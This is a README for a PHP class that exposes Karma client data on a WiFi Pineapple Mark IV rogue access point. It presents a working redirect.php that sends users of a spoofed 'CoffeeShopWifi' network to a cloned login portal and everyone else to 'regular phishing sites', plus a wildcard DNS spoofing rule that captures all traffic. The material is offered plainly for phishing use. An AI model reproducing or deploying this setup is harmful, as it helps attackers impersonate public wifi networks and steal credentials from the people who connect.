# wfp_karma_php
Karma PHP class for Wifi Pineapple Mark IV

This PHP class allows you to see the current Karma clients and their info in a your PHP.

It's essentially the core karma functions from the dashboard wrapped in a PHP class.

This allows you to do some advanced phishing, particularly AP-Based Phishing in your redirect.php.

Let's look at an example.

Let's say you want to take all traffic from "CoffeeShopWifi" and phish with your CoffeeFi portal clone, while still letting all those other random APs filter through to your normal phishing sites.

Set up your redirect.php like so, using Karma.php:

```php
<?php
//AP-based redirecting
    require_once("Karma.php");	//this should be in the same dir as your redirect.php
    $client_ip = $_SERVER['REMOTE_ADDR'];	//get the IP the client is connected to the WFP on
    $karma = new Karma();	//instantiate
    $karma->loadStations();	//this loads the current clients into Karma
    
    $client_ap = $karma->get_ssid_by_ip($client_ip);	//this gets the current user's AP
    
    if(!empty($client_ap)){
		switch(strtolower($client_ap)){
			case "cofeeshopwifi":
			    header('Status: 302 Found');
                header('Location: coffeelogin.html');
                break;
        }	
	}

    
    //Fall through to site-based redirecting
    $ref = "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
    if (strpos($ref, "example")){
	    header('Status: 302 Found');
        header('Location: example.php');
    }
    //... 
    //all the rest of your regular phishing sites
    //..
```

Note: In order for this to work, you need to set up your dns spoofing rules to capture all requests:
```
172.16.42.1 *
```
